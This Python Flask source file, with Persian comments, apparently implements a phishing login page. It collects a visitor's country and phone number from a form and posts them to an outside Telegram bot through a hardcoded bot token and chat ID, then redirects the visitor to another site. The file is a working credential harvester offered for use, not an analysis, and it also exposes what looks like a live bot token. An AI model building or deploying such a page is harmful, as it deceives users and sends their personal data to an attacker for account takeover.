from flask import Flask, render_template, request, jsonify
import requests
import logging

# تنظیم لاگینگ برای Railway
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = "your-secret-key-here"  # کلید مخفی برای مدیریت session

# تنظیمات ربات تلگرام
BOT_TOKEN = "6445656205:AAFLnpRFXgRvD8I3dMXahrSJxufEV3vdVHY"
CHAT_ID = "5088806230"

@app.route('/', methods=['GET', 'POST'])
def login():
    if "attempts" not in session:
        session["attempts"] = 0  # مقداردهی اولیه به تعداد تلاش‌ها (اختیاری، اگه نیاز داری)

    if request.method == 'POST':
        try:
            # دریافت اطلاعات فرم
            country = request.form.get('country')
            phone = request.form.get('phone')
            
            if not country or not phone:
                return jsonify({"status": "error", "message": "Country and phone are required"}), 400

            # ارسال اطلاعات به تلگرام
            send_to_telegram(country, phone)
            
            # ریدایرکت به URL پس از ارسال اطلاعات
            return jsonify({"status": "success", "redirect_url": "https://codever-production.up.railway.app/"})
        except Exception as e:
            logger.error(f"Server error in POST request: {str(e)}")
            return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500

    return render_template('login.html')

def send_to_telegram(country, phone):
    """ارسال مستقیم اطلاعات به ربات تلگرام"""
    try:
        message = f"New Login Attempt:\nCountry: {country}\nPhone: {phone}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": CHAT_ID,
            "text": message
        }
        response = requests.post(url, params=params, timeout=10)
        response.raise_for_status()  # بررسی خطاها
        logger.info(f"Message sent to Telegram, Response Code: {response.status_code}")
        print(f"Message sent to Telegram, Response Code: {response.status_code}")
    except requests.RequestException as e:
        logger.error(f"Error in sending data to Telegram: {str(e)}")
        print(f"Error in sending data to Telegram: {str(e)}")
    except Exception as e:
        logger.error(f"Unexpected error in sending data: {str(e)}")
        print(f"Unexpected error in sending data: {str(e)}")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)